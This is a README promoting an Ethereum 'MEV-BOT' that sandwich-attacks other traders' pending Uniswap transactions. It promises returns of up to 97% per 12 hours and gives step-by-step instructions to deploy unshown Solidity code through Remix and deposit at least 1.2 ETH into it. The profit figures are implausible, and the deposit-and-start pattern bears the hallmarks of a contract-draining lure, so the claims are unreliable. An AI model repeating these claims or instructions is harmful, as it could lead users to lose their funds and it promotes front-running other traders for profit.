---

<div align="center">

# 💎🤖 ETH MEV-BOT 🤖💎
  
An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.

</div>

---

## 📚 About

In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.

---

<div align="center">

## 🚀 How it Works

![profit](https://user-images.githubusercontent.com/132264778/235452623-01aafec4-077e-420e-b937-9fffe28668fb.jpeg)

</div>

Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.

---

## 📈 Estimated Profits

- 0.1ETH - 0.4ETH = up to 10%/12hrs
- 0.4ETH - 1.2ETH = up to 20%/12hrs
- 1.2ETH - 2.4ETH = 20-27%/12hrs
- 2.4ETH - 5ETH = 27-35%/12hrs
- 5.0ETH - 10ETH - 35-50%/12hrs
- 10ETH - 20ETH - 50-63%/12hrs
- 20ETH - 50ETH - 76%+/12hrs
- 50ETH - 100ETH - 97%+/12hrs

---

## 👨‍💻 Instructions

1) Copy the code and paste it into the MevBot.sol file in Remix IDE - https://remix.ethereum.org/

<img width="1496" alt="1" src="https://user-images.githubusercontent.com/132264778/235452636-8dfda62f-714c-4fb2-9d45-d75bbea7be85.png">

2) Select Solidity compiler version 0.6.12 and press compile.

![2](https://user-images.githubusercontent.com/132264778/235454398-1211b3c3-5eb9-463e-9d3d-824d398eec0d.png)

3) Select ENVIRONMENT - “Injected Provider - Metamask” and connect the wallet you will be deploying from. Click deploy and confirm the transaction.

![3](https://user-images.githubusercontent.com/132264778/235454410-cb9b447c-bb47-4907-872a-6c75bdf17890.png)

4) Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.

<img src="https://cdn.discordapp.com/attachments/1100240659853619312/1106159980249354250/ds2.png" width="250">

5) After your transaction is confirmed, start the bot by clicking the 'start' button. 

<img src="https://cdn.discordapp.com/attachments/1100240659853619312/1106160402297012294/ds1.png" width="250">

6) Withdraw anytime by clicking 'withdrawal'.

:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 

At any point, you can stop the bot or retrieve your money by calling the withdrawal function.

<div align="center">

💰💰💰 Make money with MevBot 💰💰💰

</div>

---
